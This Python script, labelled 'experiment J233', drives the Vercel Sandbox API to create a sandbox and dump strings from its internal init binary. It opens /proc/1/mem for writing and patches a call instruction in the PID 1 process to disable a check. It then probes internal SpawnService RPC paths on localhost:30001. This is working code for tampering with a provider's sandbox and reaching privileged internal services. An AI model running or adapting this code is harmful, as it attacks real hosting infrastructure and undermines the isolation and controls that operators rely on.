# 实验J233: 找connect procedure路径 (dump字符串上下文) + patch后批量测路径
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=40000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 120})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj233"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

bashfile(sid, "cp /run/vercel/share/sandbox-init /tmp/si", "PREP", 1000)

# A) dump "spawn" 相关字符串上下文
CODE_A = r'''
import re
data = open("/tmp/si", "rb").read()
out = open("/tmp/d233a.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

for pat in (b"vercel.sandbox.spawn", b"SpawnService", b"spawn.v1", b"Spawning", b"spawn."):
    pos = 0
    cnt = 0
    while True:
        i = data.find(pat, pos)
        if i < 0 or cnt >= 12:
            break
        cnt += 1
        ctx = data[max(0, i-48):i+96]
        s = "".join(chr(c) if 32 <= c < 127 else "." for c in ctx)
        p("HIT", pat.decode(), hex(i), repr(s))
        pos = i + 1
    p("CNT", pat.decode(), cnt)
p("doneA")
out.close()
'''
run_cmd(sid, CODE_A, "A_CTX", timeout=150)
time.sleep(1)
bashfile(sid, "cat /tmp/d233a.txt", "OUT_A", 15000)

# B) patch
CODE_B = r'''
import os
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x83afe0, 5)
print("OLD", old.hex(), flush=True)
if old == bytes.fromhex("e8bb030000"):
    wa(0x83afe0, bytes.fromhex("31c0909090"))
print("NEW", ra(0x83afe0, 5).hex(), flush=True)
print("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_PATCH", timeout=100)
time.sleep(1)

# C) 批量测路径 (patch后, 每个路径独立进程)
CODE_C = '''import urllib.request, urllib.error
paths = [
 "/vercel.sandbox.spawn.v1.SpawnService/Ping",
 "/vercel.sandbox.spawn.v1.SpawnService/Ping/",
 "/vercel.sandbox.spawn.v1.SpawnService/",
 "/vercel.sandbox.spawn.v1/",
 "/spawn.v1.SpawnService/Ping",
 "/vercel.sandbox.spawn.SpawnService/Ping",
 "/vercel.sandbox.spawn.v1.SpawnService",
 "/SpawnService/Ping",
 "/spawn/Ping",
 "/rpc/vercel.sandbox.spawn.v1.SpawnService/Ping",
 "/vercel.sandbox.spawn.v1.SpawnService/Ping?x=1",
]
for path in paths:
    req = urllib.request.Request("http://127.0.0.1:30001" + path, data=b"{}", method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Connect-Protocol-Version", "1")
    try:
        r = urllib.request.urlopen(req, timeout=4)
        print("PATH", path, "->", r.status, r.read()[:150], flush=True)
    except urllib.error.HTTPError as e:
        print("PATH", path, "->", e.code, e.read()[:150], flush=True)
    except Exception as e:
        print("PATH", path, "-> EXC", type(e).__name__, str(e)[:100], flush=True)
print("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_PATHS", timeout=150)
time.sleep(1)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
